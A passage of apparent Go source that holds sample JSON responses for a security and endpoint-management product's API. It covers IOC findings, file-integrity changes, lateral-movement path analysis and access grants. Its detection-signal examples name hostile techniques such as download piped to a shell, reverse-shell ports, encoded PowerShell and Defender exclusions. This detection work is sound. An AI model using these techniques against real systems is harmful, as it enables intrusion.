			{"slug": "deploy-software", "title": "Deploy software", "summary": "Package an installer once and install it on any group of endpoints.", "group": "Manage endpoints", "order": 30, "pages": ["/software"]}
		]
	}`,
	"GET /api/help/{slug}": `{
		"slug": "getting-started", "title": "Getting started", "summary": "Sign in, add your first endpoints and find your way around.",
		"group": "Start here", "order": 1, "pages": ["/"],
		"html": "<h2 id=\"add-your-first-endpoint\">Add your first endpoint</h2>\n<ol>\n<li>Open <strong>Client Management → Manual Install</strong>.</li>\n</ol>\n"
	}`,
	"GET /api/guide": `{
		"counts": {"open": 2, "critical": 0, "high": 0},
		"items": [
			{` + guideCertItemFields + `, "last_seen": "2026-10-20T08:40:21Z"},
			{` + guideAgentsItemFields + `, "last_seen": "2026-10-20T08:40:21Z"}
		]
	}`,
	// The same items after the pass the refresh runs: still true, so
	// only last_seen moves.
	"POST /api/guide/refresh": `{
		"counts": {"open": 2, "critical": 0, "high": 0},
		"items": [
			{` + guideCertItemFields + `, "last_seen": "2026-10-20T08:41:03Z"},
			{` + guideAgentsItemFields + `, "last_seen": "2026-10-20T08:41:03Z"}
		]
	}`,

	// health
	"GET /api/health": `{
		"bands": {"good": 1, "fair": 1, "poor": 0, "very poor": 0, "unreported": 0},
		"endpoints": [
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"site": "dc-east",
				"online": true,
				"score": 85,
				"band": "fair",
				"breakdown": {"cpu": 50, "memory": 100, "disk": 100},
				"detail": {"cpu_current": 12.4, "cpu_average": 18.9, "cpu_peak": 97.2, "cpu_events": 1, "memory_current": 61.3, "memory_average": 58.7, "memory_peak": 74.1, "memory_events": 0, "disk_current": 47.5, "disk_peak": 47.9, "disk_events": 0, "samples": 1440, "window_hours": 24},
				"reported": true
			},
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"site": "hq",
				"online": true,
				"score": 100,
				"band": "good",
				"breakdown": {"cpu": 100, "memory": 100, "disk": 100},
				"detail": {"cpu_current": 6.1, "cpu_average": 9.8, "cpu_peak": 63, "cpu_events": 0, "memory_current": 52.6, "memory_average": 55.2, "memory_peak": 71.8, "memory_events": 0, "disk_current": 38.2, "disk_peak": 38.4, "disk_events": 0, "samples": 1302, "window_hours": 24},
				"reported": true
			}
		],
		"fleet_band": "good",
		"fleet_score": 93
	}`,

	// hunt
	"GET /api/hunt/findings": `{
		"findings": [
			{
				"id": "ioc-f-2c8e4a0f6b1d47e9a3c5b7d9f1e0a2c4",
				"ioc_id": "ioc-7b3d9f1a5e2c48b6a0d4c8e2f6b1a9d3",
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"matched_value": "C:\\Users\\jdoe\\Downloads\\invoice_2041.exe",
				"context": "file at C:\\Users\\jdoe\\Downloads\\invoice_2041.exe matches the hash",
				"first_seen": "2026-10-19T16:22:05Z",
				"last_seen": "2026-10-20T08:22:05Z",
				"acknowledged": false,
				"ioc_name": "Dropper from INC-2041",
				"ioc_kind": "file_hash",
				"ioc_severity": "critical"
			}
		],
		"outstanding": 1
	}`,
	"GET /api/hunt/iocs":      `{"iocs": [` + iocDropperExample + `]}`,
	"POST /api/hunt/iocs":     iocDropperExample,
	"PUT /api/hunt/iocs/{id}": iocDropperExample,
	"POST /api/hunt/run":      `{"new_findings": 1}`,
	"GET /api/hunt/signal-findings": `{
		"findings": [
			{
				"id": "sig-f-5a1c7e3b9d2f48e6a0c4b8d2e6f1a3c7",
				"signal_id": "sig-3e9c5a1f7b2d48e6a0c4b8d2f6e1a3c9",
				"signal_name": "Cron or sudoers changed",
				"signal_severity": "warning",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"kind": "file",
				"summary": "write /etc/sudoers.d/deploy",
				"count": 1,
				"first_seen": "2026-10-20T03:14:51Z",
				"last_seen": "2026-10-20T03:14:51Z",
				"acknowledged": false
			}
		]
	}`,

	// integrations
	"GET /api/admin/integrations": integrationsListExample,
	// The list again, with the body example's webhook just created:
	// nothing sent through it yet.
	"POST /api/admin/integrations": `{
		` + integrationsTailExample + `,
		"integrations": [
			` + prometheusIntegrationExample + `,
			{` + socWebhookFields + `, "sent": 0}
		]
	}`,
	// The list again: the body replaces the webhook's settings, and what
	// it cannot send (who created it, what was delivered) is kept.
	"PUT /api/admin/integrations/{id}": integrationsListExample,
	// A test event was delivered. A Prometheus integration sends
	// nothing and says so instead; a failed delivery is a 422.
	"POST /api/admin/integrations/{id}/test": `{"result": "sent"}`,

	// integrity
	// Every change recorded, newest first: the sudoers drop-in behind the
	// signal finding, Windows rewriting a task a label explains, and an
	// nginx.conf permission change jdoe has looked into. unexpected counts
	// this list; the metrics the last seven days. A change carries was,
	// now and because only when they say something. A file's hash is
	// written in full, whatever the kind of change; a change an older
	// server recorded may carry a 12-character one.
	"GET /api/integrity": `{
		"changes": [
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"path": "/etc/sudoers.d/deploy",
				"kind": "added",
				"what": "file",
				"now": "2e6402d563b2efc500483a07a22c2fc40e9b93df52ebed91089d89e0ce7980f9",
				"detected_at": "2026-10-20T03:15:07Z",
				"expected": false,
				"id": "18342",
				"labels": []
			},
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"path": "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
				"kind": "modified",
				"what": "contents",
				"was": "a4904227e9e095fd505e97950445eda4fbd015a1bb3abc3511ec616f3b29b9e7",
				"now": "a91cec977463b7efa3dac5cfe75c49b31700c90c26687a6200dd8922eb87f30e",
				"detected_at": "2026-10-20T02:12:44Z",
				"expected": true,
				"because": "label: Windows scheduled-task housekeeping",
				"id": "18339",
				"labels": ["Windows scheduled-task housekeeping"]
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"path": "/etc/nginx/nginx.conf",
				"kind": "modified",
				"what": "permissions",
				"was": "-rw-r--r--",
				"now": "-rw-rw-rw-",
				"detected_at": "2026-10-19T16:40:12Z",
				"expected": false,
				"id": "18307",
				"labels": [],
				"acknowledged_at": "2026-10-19T17:25:48Z",
				"acknowledged_by": "jdoe"
			}
		],
		"coverage": {"applied": 1, "monitored": 1, "total": 2},
		"metrics": {
			"unexpected_7d": 2,
			"expected_7d": 1,
			"unacknowledged": 1,
			"mean_time_to_investigate_hours": 0.76,
			"by_endpoint": [{"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "unexpected": 2}]
		},
		"reporting_endpoints": 2,
		"unexpected": 2,
		"watched_files": 350
	}`,
	// false when the change was acknowledged already, or no change has
	// the ID.
	"POST /api/integrity/changes/{id}/ack": `{"acknowledged": true}`,
	// Highest priority first, then by name.
	"GET /api/integrity/labels": `{
		"labels": [
			{` + packageLabelFields + `, "updated_at": "2026-10-08T11:03:27Z"},
			{
				"id": "lbl-6f40be3c0ba577babbb9e3cff37f0afd",
				"name": "Windows scheduled-task housekeeping",
				"expected": true,
				"criteria": {"kinds": ["modified"], "path_prefix": "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\"},
				"priority": 10,
				"enabled": true,
				"created_by": "mustra",
				"created_at": "2026-03-02T13:52:18Z",
				"updated_at": "2026-03-02T13:52:18Z"
			}
		]
	}`,
	// The label as stored. A new label is always enabled.
	"POST /api/integrity/labels": `{` + packageLabelFields + `, "updated_at": "2026-10-06T09:12:45Z"}`,
	// The body's criteria against the changes recorded (of): none of the
	// three is under /usr/, so the label would tag none.
	"POST /api/integrity/labels/test": `{"matched": 0, "of": 3, "sample": []}`,
	"PUT /api/integrity/labels/{id}":  `{` + packageLabelFields + `, "updated_at": "2026-10-08T11:03:27Z"}`,
	"GET /api/integrity/monitors":     `{"monitors": [{` + webConfigMonitorFields + `, "updated_at": "2026-10-02T15:31:20Z"}]}`,
	// The monitor as stored, with its watchlist's name. A new monitor is
	// always enabled.
	"POST /api/integrity/monitors":     `{` + webConfigMonitorFields + `, "updated_at": "2026-09-24T10:18:33Z"}`,
	"PUT /api/integrity/monitors/{id}": `{` + webConfigMonitorFields + `, "updated_at": "2026-10-02T15:31:20Z"}`,
	// Every endpoint, by hostname. web-01 runs the set the monitor gives
	// it: the watchlist's two paths and one registry key, unfiltered by
	// OS. FIN-LT-0142 is under no monitor, so it wants the built-in set
	// only (empty revision) and has it.
	"GET /api/integrity/watch-status": `{
		"applied": 1,
		"endpoints": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"online": true,
				"agent_version": "0.57.40",
				"monitors": [],
				"paths": 0,
				"registry_keys": 0,
				"want_revision": "",
				"have_revision": "",
				"applied": true,
				"needs_upgrade": false,
				"follow_symlinks": false
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"online": true,
				"agent_version": "0.57.41",
				"monitors": ["Web server configuration"],
				"paths": 2,
				"registry_keys": 1,
				"want_revision": "3f9a1c7e2b40",
				"have_revision": "3f9a1c7e2b40",
				"applied": true,
				"needs_upgrade": false,
				"follow_symlinks": false
			}
		],
		"monitored": 1,
		"needs_upgrade": 0,
		"total": 2
	}`,
	// Saving a monitor pushes the new sets by itself; this re-pushes to
	// the online endpoints that do not run theirs yet, as the server also
	// does every five minutes: here web-01, back online after missing a
	// push. failed maps a hostname to why its push failed.
	"POST /api/integrity/watch-status/apply": `{"failed": {}, "pushed": 1}`,

	// The signal of the body examples. The list also carries the
	// objects and fields an expression can read, and every one of the
	// editor's starting points, as signalExamples has them.
	"GET /api/hunt/signals": `{
		"examples": [
			{"expression": "process.name contains 'powershell' AND (process.command_line contains '-enc' OR process.command_line contains '-EncodedCommand' OR process.command_line contains 'FromBase64String')", "name": "PowerShell with an encoded command", "severity": "critical"},
			{"expression": "(process.command_line contains 'curl' OR process.command_line contains 'wget') AND (process.command_line contains '| sh' OR process.command_line contains '| bash' OR process.command_line contains '|sh' OR process.command_line contains '|bash')", "name": "Download piped to a shell", "severity": "critical"},
			{"expression": "registry.key contains '\\CurrentVersion\\Run' AND registry.op != 'delete'", "name": "New autorun written", "severity": "warning"},
			{"expression": "registry.key contains 'Windows Defender\\Exclusions' AND registry.op != 'delete'", "name": "Defender exclusion added", "severity": "critical"},
			{"expression": "registry.key ends with '\\Control\\Lsa' AND (registry.value equals 'Security Packages' OR registry.value equals 'Authentication Packages' OR registry.value equals 'Notification Packages')", "name": "LSA authentication package changed", "severity": "critical"},
			{"expression": "network.direction equals 'connect' AND network.remote_port in [4444, 1337, 31337, 5555, 6666]", "name": "Connection to a common reverse-shell port", "severity": "critical"},
			{"expression": "network.direction equals 'connect' AND network.process in ['winword.exe', 'excel.exe', 'powerpnt.exe', 'outlook.exe'] AND NOT network.remote_ip starts with '10.'", "name": "Office application connecting out", "severity": "warning"},
			{"expression": "network.direction equals 'listen' AND network.local_port > 1024 AND NOT network.process in ['sshd', 'node', 'docker-proxy', 'nats-server', 'postgres']", "name": "New listener on an unusual port", "severity": "warning"},
			{"expression": "dns.query matches '^[a-z0-9]{25,}\\.'", "name": "Suspiciously long DNS label", "severity": "warning"},
			{"expression": "dns.query ends with '.onion' OR dns.query contains 'pastebin' OR dns.query contains 'ngrok'", "name": "Tor or paste-site resolution", "severity": "warning"},
			{"expression": "logon.outcome equals 'failure' AND (logon.reason contains 'no such user' OR logon.reason contains 'disabled' OR logon.reason contains 'invalid user')", "name": "Failed logon for a disabled or unknown account", "severity": "warning"},
			{"expression": "logon.outcome equals 'success' AND logon.type in ['remote-interactive', 'ssh-password', 'ssh-publickey'] AND NOT logon.source starts with '10.' AND NOT logon.source equals 'local'", "name": "Remote interactive logon from outside the LAN", "severity": "critical"},
			{"expression": "(file.path starts with '/etc/cron' OR file.path starts with '/etc/sudoers') AND file.op != 'remove'", "name": "Cron or sudoers changed", "severity": "warning"}
		],
		"objects": {
			"dns": ["query", "answers", "process"],
			"file": ["path", "op"],
			"logon": ["user", "domain", "source", "type", "outcome", "reason"],
			"network": ["protocol", "direction", "local_ip", "local_port", "remote_ip", "remote_port", "process", "user"],
			"process": ["name", "command_line", "user", "pid", "ppid"],
			"registry": ["key", "value", "data", "op", "process", "user"]
		},
		"signals": [
			{
				"id": "sig-3e9c5a1f7b2d48e6a0c4b8d2f6e1a3c9",
				"name": "Cron or sudoers changed",
				"description": "A scheduled job or sudo rule written outside a change",
				"severity": "warning",
				"expression": "(file.path starts with '/etc/cron' OR file.path starts with '/etc/sudoers') AND file.op != 'remove'",
				"objects": ["file"],
				"enabled": true,
				"created_by": "jdoe",
				"created_at": "2026-09-28T13:47:05Z",
				"updated_at": "2026-09-28T13:47:05Z"
			}
		]
	}`,
	// A save answers with the signal's ID and the objects its expression
	// reads, which decide the events it is evaluated against.
	"POST /api/hunt/signals": `{"id": "sig-3e9c5a1f7b2d48e6a0c4b8d2f6e1a3c9", "objects": ["file"]}`,
	// The body example's expression over the last 1,000 file events: it
	// would have caught the write the signal-findings example shows.
	"POST /api/hunt/signals/test": `{
		"hits": [{"kind": "file", "hostname": "web-01", "at": "2026-10-20T03:14:51Z", "summary": "write /etc/sudoers.d/deploy"}],
		"objects": ["file"],
		"scanned": 1000
	}`,
	"PUT /api/hunt/signals/{id}": `{"id": "sig-3e9c5a1f7b2d48e6a0c4b8d2f6e1a3c9", "objects": ["file"]}`,

	// impact: the fleet of 42 described above, against the CORP domain.
	// Every workstation has its local Administrator, Domain Admins and
	// Workstation Admins as administrators, and its owner signed in. The
	// Helpdesk group sits in Workstation Admins: rpatel and asmith are
	// signed in on one workstation each, and tlee has left (disabled).
	// The web servers each have root, a deploy account in the sudo
	// group, and the admin and sudo groups from the stock sudoers.
	//
	// The overview counts levels over every row and shows the top eight
	// of each kind; computed_at is the time of the analysis, in UTC, to
	// the nanosecond. ENG-WS-0503 is offline.
	"GET /api/impact/overview": `{
		"computed_at": "2026-10-20T09:41:07.318402117Z",
		"coverage": {"endpoints": 42, "reporting_admins": 42, "with_sessions": 30, "directory_users": 37, "unresolved_grants": 0},
		"directory": {"counts": {"users": 37, "groups": 5, "computers": 29, "memberships": 43, "synced_at": "2026-10-20T08:30:11Z"}, "enabled": true, "last_error": "", "last_sync": "2026-10-20T08:30:12Z"},
		"findings": [
			{"category": "Account administers a large share of the fleet", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1110", "subject_kind": "user", "subject_name": "adm-jdoe", "count": 29, "detail": "Administers 29 of 42 endpoints, 1 of them critical or a domain controller"},
			{"category": "Account administers a large share of the fleet", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-500", "subject_kind": "user", "subject_name": "Administrator", "count": 29, "detail": "Administers 29 of 42 endpoints, 1 of them critical or a domain controller"},
			{"category": "Account administers a large share of the fleet", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1113", "subject_kind": "user", "subject_name": "asmith", "count": 28, "detail": "Administers 28 of 42 endpoints"},
			{"category": "Account administers a large share of the fleet", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1112", "subject_kind": "user", "subject_name": "rpatel", "count": 28, "detail": "Administers 28 of 42 endpoints"},
			{"category": "Account administers a large share of the fleet", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1114", "subject_kind": "user", "subject_name": "tlee", "count": 28, "detail": "Administers 28 of 42 endpoints"},
			{"category": "Privileged account signed in outside the domain controllers", "severity": "critical", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1110", "subject_kind": "user", "subject_name": "adm-jdoe", "count": 1, "detail": "Signed in on FIN-LT-0142; anyone who administers those machines can take this credential."},
			{"category": "Group grants administration broadly", "severity": "high", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1105", "subject_kind": "group", "subject_name": "Helpdesk", "count": 28, "detail": "Administers 28 of 42 endpoints; 3 user(s) inherit that."},
			{"category": "Group grants administration broadly", "severity": "high", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1104", "subject_kind": "group", "subject_name": "Workstation Admins", "count": 28, "detail": "Administers 28 of 42 endpoints; 3 user(s) inherit that."},
			{"category": "Group grants administration broadly", "severity": "medium", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-512", "subject_kind": "group", "subject_name": "Domain Admins", "count": 29, "detail": "Administers 29 of 42 endpoints, 1 of them critical or a domain controller; 2 user(s) inherit that."},
			{"category": "Disabled account still administers endpoints", "severity": "medium", "subject_id": "S-1-5-21-3623811015-3361044348-30300820-1114", "subject_kind": "user", "subject_name": "tlee", "count": 28, "detail": "The account is disabled in the directory but is still an administrator on 28 endpoint(s)."},
			{"category": "Local administrator name repeated across endpoints", "severity": "medium", "subject_id": "local:agt-0e4a8c2f6b1d47e9a3c5f7b9d1e2a4c8:deploy", "subject_kind": "local", "subject_name": "deploy", "count": 12, "detail": "A local account called deploy administers 12 endpoints. If the password is shared, so is the access."}
		],
		"levels": {
			"endpoints": {"critical": 3, "high": 0, "low": 0, "medium": 0, "none": 39},
			"groups": {"critical": 3, "high": 1, "low": 0, "medium": 0, "none": 25},
			"users": {"critical": 5, "high": 2, "low": 52, "medium": 0, "none": 32}
		},
		"top_endpoints": [
			{"id": "agt-55ff4b49b4523976bb8dcaf7ef45723e", "kind": "endpoint", "name": "HR-LT-0311", "level": "critical", "score": 36, "hostname": "HR-LT-0311", "domain_controller": false, "online": true, "admins": 6, "outbound": 28, "inbound": 2},
			{"id": "agt-cdf88dda2a195e816216e6af294496f8", "kind": "endpoint", "name": "SALES-LT-0207", "level": "critical", "score": 36, "hostname": "SALES-LT-0207", "domain_controller": false, "online": true, "admins": 6, "outbound": 28, "inbound": 2},
			{"id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "kind": "endpoint", "name": "FIN-LT-0142", "level": "critical", "score": 35, "hostname": "FIN-LT-0142", "criticality": "medium", "domain_controller": false, "online": true, "admins": 6, "outbound": 28, "inbound": 2},
			{"id": "agt-a5f17ac9d34a0b8dd362373426b5497f", "kind": "endpoint", "name": "build-mac-02", "level": "none", "score": 0, "hostname": "build-mac-02", "domain_controller": false, "online": true, "admins": 2, "outbound": 0, "inbound": 0},
			` + impactDC01Rating + `,
			{"id": "agt-f2186db113498316f127654640555424", "kind": "endpoint", "name": "ENG-WS-0501", "level": "none", "score": 0, "hostname": "ENG-WS-0501", "domain_controller": false, "online": true, "admins": 6, "outbound": 0, "inbound": 3},
			{"id": "agt-4e44cc5ddb137948dd4c66fa5d862f4d", "kind": "endpoint", "name": "ENG-WS-0503", "level": "none", "score": 0, "hostname": "ENG-WS-0503", "domain_controller": false, "online": false, "admins": 6, "outbound": 0, "inbound": 3},
			{"id": "agt-af8e6801f363d554d4669e425ea5a846", "kind": "endpoint", "name": "ENG-WS-0508", "level": "none", "score": 0, "hostname": "ENG-WS-0508", "domain_controller": false, "online": true, "admins": 6, "outbound": 0, "inbound": 3}
		],
		"top_groups": [
			{"id": "S-1-5-21-3623811015-3361044348-30300820-512", "kind": "group", "name": "Domain Admins", "domain": "CORP", "level": "critical", "score": 37, "controls": 29, "direct_controls": 29, "controls_critical": 1, "sessions": 0, "member_users": 2, "enabled": true, "admin_count": true},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1105", "kind": "group", "name": "Helpdesk", "domain": "CORP", "level": "critical", "score": 29, "controls": 28, "direct_controls": 0, "controls_critical": 0, "sessions": 0, "member_users": 3, "enabled": true, "admin_count": false},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1104", "kind": "group", "name": "Workstation Admins", "domain": "CORP", "level": "critical", "score": 29, "controls": 28, "direct_controls": 28, "controls_critical": 0, "sessions": 0, "member_users": 3, "enabled": true, "admin_count": false},
			{"id": "local_group:agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4:admin", "kind": "local_group", "name": "admin", "domain": "web-01", "level": "none", "score": 8, "controls": 1, "direct_controls": 1, "controls_critical": 1, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-519", "kind": "group", "name": "Enterprise Admins", "domain": "CORP", "level": "high", "score": 8, "controls": 1, "direct_controls": 1, "controls_critical": 1, "sessions": 0, "member_users": 1, "enabled": true, "admin_count": true},
			{"id": "local_group:agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4:sudo", "kind": "local_group", "name": "sudo", "domain": "web-01", "level": "none", "score": 8, "controls": 1, "direct_controls": 1, "controls_critical": 1, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "local_group:agt-6a0e4c8f2b1d47e9a5c3d7f1b9e2a4c6:admin", "kind": "local_group", "name": "admin", "domain": "web-03", "level": "none", "score": 1, "controls": 1, "direct_controls": 1, "controls_critical": 0, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "local_group:agt-8c2e6a0f4b1d47e3a9c5b7d1f3e9a0c4:admin", "kind": "local_group", "name": "admin", "domain": "web-04", "level": "none", "score": 1, "controls": 1, "direct_controls": 1, "controls_critical": 0, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false}
		],
		"top_users": [
			` + impactAdmJdoeRating + `,
			` + impactAdministratorRating + `,
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1113", "kind": "user", "name": "asmith", "domain": "CORP", "level": "critical", "score": 29, "controls": 28, "direct_controls": 0, "controls_critical": 0, "sessions": 1, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1112", "kind": "user", "name": "rpatel", "domain": "CORP", "level": "critical", "score": 29, "controls": 28, "direct_controls": 0, "controls_critical": 0, "sessions": 1, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1114", "kind": "user", "name": "tlee", "domain": "CORP", "level": "critical", "score": 29, "controls": 28, "direct_controls": 0, "controls_critical": 0, "sessions": 0, "member_users": 0, "enabled": false, "admin_count": false},
			{"id": "local:agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4:deploy", "kind": "local", "name": "deploy", "domain": "web-01", "level": "high", "score": 8, "controls": 1, "direct_controls": 1, "controls_critical": 1, "sessions": 1, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "local:agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4:root", "kind": "local", "name": "root", "domain": "web-01", "level": "high", "score": 8, "controls": 1, "direct_controls": 1, "controls_critical": 1, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false},
			{"id": "local:agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9:administrator", "kind": "local", "name": "Administrator", "domain": "fin-lt-0142", "level": "low", "score": 2, "controls": 1, "direct_controls": 1, "controls_critical": 0, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": false}
		]
	}`,
	// The domain controller: who holds the grant, by name and through
	// Domain Admins, and the workstations an attacker could reach it
	// from, in hops.
	"GET /api/impact/object/{id}": `{
		"rating": ` + impactDC01Rating + `,
		"direct_control": [
			{"id": "S-1-5-21-3623811015-3361044348-30300820-500", "kind": "user", "name": "Administrator", "how": "Administrators"},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-512", "kind": "group", "name": "Domain Admins", "how": "Administrators"},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-519", "kind": "group", "name": "Enterprise Admins", "how": "Administrators"}
		],
		"indirect_control": [
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1110", "kind": "user", "name": "adm-jdoe", "how": "via Domain Admins"}
		],
		"outbound": [],
		"inbound": [
			{"id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "hostname": "FIN-LT-0142", "hops": 1, "criticality": "medium"},
			{"id": "agt-55ff4b49b4523976bb8dcaf7ef45723e", "hostname": "HR-LT-0311", "hops": 2},
			{"id": "agt-cdf88dda2a195e816216e6af294496f8", "hostname": "SALES-LT-0207", "hops": 2}
		],
		"sessions": [],
		"members": [],
		"member_of": []
	}`,
	// ?from= FIN-LT-0142 &to= dc01. Each step's edge is the one that led
	// to it.
	"GET /api/impact/path": `{
		"from": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"path": [
			{"id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "kind": "endpoint", "name": "FIN-LT-0142"},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1110", "kind": "user", "name": "adm-jdoe", "edge": "signed in on"},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-512", "kind": "group", "name": "Domain Admins", "edge": "member of"},
			{"id": "agt-f3099a1e6d52b245d944186a38757d0a", "kind": "endpoint", "name": "dc01", "edge": "administers"}
		],
		"reachable": true,
		"to": "agt-f3099a1e6d52b245d944186a38757d0a"
	}`,
	// ?q=jdoe
	"GET /api/impact/search": `{
		"hits": [
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1110", "kind": "user", "name": "adm-jdoe"},
			{"id": "S-1-5-21-3623811015-3361044348-30300820-1111", "kind": "user", "name": "jdoe"}
		]
	}`,
	// /api/impact/users, highest score first; the first two of 91 rows.
	"GET /api/impact/{kind}": `{
		"computed_at": "2026-10-20T09:41:07.318402117Z",
		"rows": [` + impactAdmJdoeRating + `, ` + impactAdministratorRating + `]
	}`,

	// idnums
	// The short number of each endpoint, deployment, package and reveal
	// rule, by its text ID: web-01 and the laptop, the manual patch run
	// and the jq package.
	"GET /api/idnums": `{
		"ids": {
			"agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4": 3,
			"agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9": 18,
			"run-0e7c3a9f5b1d48e2a6c4f8b0d2e9a1c3": 57,
			"sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5": 12
		}
	}`,

	// interact
	"POST /api/interact/ask": `{
		"get": ["platform_version"],
		"counting": true,
		"rows": [
			{"values": ["24.04"], "count": 2, "agent_ids": ["agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "agt-c3e7a1f5b9d24e86a0c4d8b2f6e1a3c5"]},
			{"values": ["22.04"], "count": 1, "agent_ids": ["agt-e1a5c9f3b7d24e86a0b4c8d2f6e3a1c7"]}
		],
		"matched": 3,
		"total": 42,
		"reporting": 3,
		"text": "get platform_version from all machines with os equals linux and services.name equals nginx"
	}`,
	// Newest first: the question above, and rpatel's earlier one about
	// one laptop. matched is how many endpoints passed the from clause,
	// total how many were in inventory.
	"GET /api/interact/history": `{
		"history": [
			{"id": "q-8b2f6d0a4c1e47e9b3a5c7d9f1e3a5b7", "text": "get platform_version from all machines with os equals linux and services.name equals nginx", "asked_by": "jdoe", "asked_at": "2026-10-20T09:18:44Z", "matched": 3, "total": 42},
			{"id": "q-3e7a1c5f9b2d48e6a0c4b8d2f6e1a9c5", "text": "get installed_apps.name from all machines with hostname equals FIN-LT-0142", "asked_by": "rpatel", "asked_at": "2026-10-20T08:51:02Z", "matched": 1, "total": 42}
		]
	}`,
	// The fields a question can get or filter on come with the list: the
	// built-in vocabulary, then each custom sensor's (an excerpt here, the
	// three the saved question reads).
	"GET /api/interact/saved": `{
		"fields": [
			{"field": "os", "label": "Operating system", "kind": "string", "ops": ["equals", "not_equals", "contains", "not_contains", "starts_with", "ends_with", "regex", "in", "not_in"], "hint": "linux, windows, darwin"},
			{"field": "platform_version", "label": "Platform version", "kind": "string", "ops": ["equals", "not_equals", "contains", "not_contains", "starts_with", "ends_with", "regex", "in", "not_in"]},
			{"field": "services.name", "label": "Service name", "kind": "string", "ops": ["equals", "not_equals", "contains", "not_contains", "starts_with", "ends_with", "regex", "in", "not_in"]}
		],
		"questions": [` + savedQuestionWebExample + `]
	}`,
	// The body example has no id, so this is a new question.
	"POST /api/interact/saved": savedQuestionWebExample,

	// jump: rpatel asks for web-01 and jdoe approves 30 of the policy's
	// 60 minutes, which start at the approval.
	"GET /api/jump/grants": `{
		"can_approve": true,
		"grants": [
			{
				` + jumpGrantFields + `,
				"state": "approved",
				"decided_by": "jdoe",
				"decided_at": "2026-10-20T09:12:40Z",
				"decision_note": "Approved for INC-2041",
				"requested_at": "2026-10-20T09:05:18Z",
				"expires_at": "2026-10-20T09:42:40Z"
			}
		],
		"me": "jdoe",
		"pending": 0
	}`,
	"POST /api/jump/grants/{id}/decide": `{"id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5", "minutes": 30, "state": "approved"}`,
	"POST /api/jump/grants/{id}/revoke": `{"id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5", "state": "revoked"}`,
	"GET /api/jump/policies":            `{"policies": [` + jumpPolicyRecordExample + `], "webhook_set": true, "webhook_style": "slack"}`,
	"POST /api/jump/policies":           jumpPolicyRecordExample,
	"PUT /api/jump/policies/{id}":       jumpPolicyRecordExample,
	// The grant as stored, waiting for an approver.
	"POST /api/jump/requests": `{
		"grant": {
			` + jumpGrantFields + `,
			"state": "pending",
			"requested_at": "2026-10-20T09:05:18Z"
		},
		"message": "Access requested. It opens once somebody with jump.approve agrees."
	}`,

	// lifecycle
	// Physical machines first. Of the six lifecycle attributes only owner
	// exists (it was made by hand), so five are missing and the laptop's
	// age is counted from its firmware date. web-01 is a VM: no age.
	"GET /api/lifecycle": `{
		"endpoints": [
			{
